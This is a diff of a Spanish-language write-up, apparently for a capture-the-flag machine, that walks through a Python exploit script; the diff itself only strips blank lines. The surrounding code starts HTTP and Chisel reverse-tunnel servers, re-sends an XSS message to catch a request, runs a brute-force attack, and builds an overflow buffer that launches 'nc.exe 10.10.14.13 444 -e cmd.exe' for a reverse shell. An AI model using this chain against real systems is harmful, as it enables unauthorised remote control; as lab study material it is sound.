@@ -25,7 +25,6 @@ with open('pwn.js', 'w') as file:
 ```
 Despues, crea y ejecuta los servidores **HTTP** y **SMB**, junto con **Chisel**, en segundo plano.
 ```python3
-
 http_server = subprocess.Popen(["python3","-m","http.server","80"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
 
 chisel_server = subprocess.Popen(["./chisel","server","-p","8080", "--reverse"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
@@ -73,10 +72,6 @@ def login():
 	ID = s.cookies.get_dict()["id"]
 
 	return ID
-
-
-
-
 ```
 Con el **ID** ya obtenido, la función **Send_XSS** envía el mensaje y monitorea el servidor **HTTP** en espera de una petición **GET**. Para garantizar su persistencia, el mensaje se reenvía cada minuto en caso de que sea eliminado. Una vez que la petición es recibida, el proceso vuelve a esperar hasta que el puerto **910** es abierto.
 
@@ -121,13 +116,11 @@ def logs_get():
 	global line
 	line = http_server.stderr.readline().strip()
 	print(line)
-
 ```
 
 Tras la apertura del puerto **910** comienza el ataque de fuerza bruta en segundo plano, mientras por otro lado, es puesto en escucha, para recibir la shell como el usuario admin.
 
 ```python3
-
 def brutef_buffer():
 
 	buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\\Users\\Cortin\\AppData\\Local\\Temp\\nc.exe 10.10.14.13 444 -e cmd.exe"
@@ -198,5 +191,4 @@ def R_Shell():
 			result = receive_all(conn)
 			print(result)
 			cont = 1
-
 ```
